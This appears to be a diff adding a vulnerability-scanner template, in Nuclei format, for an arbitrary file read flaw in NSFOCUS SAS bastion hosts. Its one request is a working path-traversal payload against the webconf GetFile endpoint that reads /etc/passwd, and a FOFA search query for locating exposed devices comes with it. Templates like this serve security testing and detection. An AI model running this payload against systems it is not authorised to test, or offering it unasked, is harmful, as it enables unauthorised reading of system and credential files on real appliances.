@@ -1,0 +1,25 @@
+id: Nsfocus-SAS_read_webconf
+
+info:
+  name: Nsfocus-SAS_read_webconf
+  author: hufei
+  severity: critical
+  description: |
+     绿盟堡垒机存在任意文件读取漏洞
+  reference:
+  metadata:
+    max-request: 3
+    fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
+  tags: Nsfocus-SAS,file,read,intrusive
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root'
